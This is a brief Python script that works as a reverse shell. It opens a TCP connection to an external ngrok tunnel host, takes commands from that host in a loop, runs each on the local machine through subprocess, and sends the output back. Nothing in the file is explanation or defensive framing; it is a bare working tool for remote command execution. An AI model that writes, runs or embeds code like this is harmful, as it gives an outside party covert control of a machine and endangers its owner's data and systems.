import socket
import subprocess
# fuck

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.connect(('0.tcp.jp.ngrok.io', 13619))


while True:
    command = s.recv(4096).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())


s.close()
